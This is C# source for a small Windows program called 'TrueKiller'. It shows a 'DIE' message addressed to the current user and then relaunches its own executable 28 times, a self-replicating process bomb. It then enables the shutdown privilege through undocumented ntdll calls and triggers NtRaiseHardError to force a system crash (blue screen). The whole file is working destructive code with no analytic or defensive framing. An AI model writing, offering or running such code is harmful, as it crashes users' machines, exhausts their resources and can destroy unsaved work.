using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace TrueKiller
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        [STAThread]
        static void Main()
        {
            MessageBox.Show($"DIE, {Environment.UserName}", "TrueKilla", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Process.Start($"{Process.GetCurrentProcess().ProcessName}.exe");
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);


        }
    }
}
